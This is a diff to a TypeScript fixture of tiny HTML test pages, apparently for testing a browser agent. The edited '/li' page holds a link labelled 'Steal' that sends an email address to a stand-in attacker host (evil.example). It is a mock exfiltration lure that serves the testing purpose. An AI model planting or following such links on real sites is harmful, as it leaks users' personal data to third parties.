@@ -33,7 +33,7 @@ const PAGES: Record<string, string> = {
   '/move': `<!doctype html><title>Move</title><body><form action="/sent" method="post"><a href="#more" id="l">Read more</a> <button type="submit" id="s">Submit application</button></form>
     <script>setTimeout(() => { const l = document.getElementById('l'), s = document.getElementById('s'); s.setAttribute('data-aang-n', l.getAttribute('data-aang-n')); l.removeAttribute('data-aang-n'); }, 600);</script></body>`,
   '/hop': `<!doctype html><title>Hop</title><body><a id="h" href="/redir">Next page</a></body>`,
-  '/li': `<!doctype html><title>LinkedIn</title><body><a id="o" href="http://shop.example:${SITE}/shop">A company site</a> <a id="x" href="http://evil.example:${SITE}/c?e=you@example.com">Steal</a></body>`,
+  '/li': `<!doctype html><title>LinkedIn</title><body><a id="o" href="http://shop.example:${SITE}/shop">A company site</a> <a id="x" href="http://evil.example:${SITE}/c?e=you%40example.com">Steal</a></body>`,
   '/form': `<!doctype html><title>Quick apply</title><body><input id="em" aria-label="Email"></body>`,
   '/enter': `<!doctype html><title>Enter</title><body><div tabindex="0" id="d" style="width:100px;height:40px">plain</div><script>document.getElementById('d').focus();</script></body>`,
 };
